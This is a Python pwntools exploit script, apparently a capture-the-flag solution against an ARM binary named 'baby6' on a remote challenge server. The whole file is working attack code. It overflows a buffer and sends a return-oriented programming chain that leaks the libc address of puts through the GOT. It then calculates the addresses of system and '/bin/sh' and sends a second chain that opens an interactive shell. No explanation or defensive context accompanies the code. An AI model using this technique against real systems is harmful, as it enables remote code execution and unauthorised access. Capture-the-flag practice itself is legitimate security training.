from pwn import *

context.arch = 'arm'
context.log_level = 'debug'
r = remote('baby-01.pwn.beer', 10006)
#r = gdb.debug('./baby6', sysroot='/usr/arm-linux-gnueabihf/')

ss = lambda x: r.sendlineafter(':', str(x))

elf = ELF('./baby6')
libc = ELF('./libc.so.6')
puts_got = elf.got['puts']
libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']
libc_binsh_offset = next(libc.search('/bin/sh\x00'))
gg = 0x8840
gg2 = 0x881c
gg3 = 0x5919c
main = 0x8654

ss(str('1\x00'+ 'a'*1022 + p32(1)))
for i in range(0,0x3c/4):
	ss(str(0x61616161))
ss(str(1))
ss(str(0x61616161))

ss(gg)
ss(1)	#r4
ss(2)	#r5
ss(puts_got)	#r6 -> r0
ss(0x1)	#r7 -> r1
ss(0x1)	#r8 -> r2
ss(6)	#r9
ss(puts_got-4)	#r10
ss(gg2)
ss(1)
ss(1)
ss(1)
ss(1)
ss(1)
ss(1)
ss(1)
ss(main)	

ss(str(0))
r.recvuntil('\n')

libc_puts = u32(r.recvuntil('\n')[:4])
libc_base = libc_puts - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_binsh = libc_base + libc_binsh_offset
libc_gg = libc_base + gg3

if libc_gg > 0x80000000:
    libc_gg = -(0x100000000 - libc_gg)

if libc_system > 0x80000000:
    libc_system = -(0x100000000 - libc_system)

if libc_binsh > 0x80000000:
    libc_binsh = -(0x100000000 - libc_binsh)

ss(str('1\x00'+ 'a'*1022 + p32(1)))
for i in range(0,0x3c/4):
        ss(str(1))
ss(str(1))
ss(str(0x61616161))

ss(libc_gg)
ss(libc_binsh)
ss(1)
ss(libc_system)

ss(0)
r.interactive()

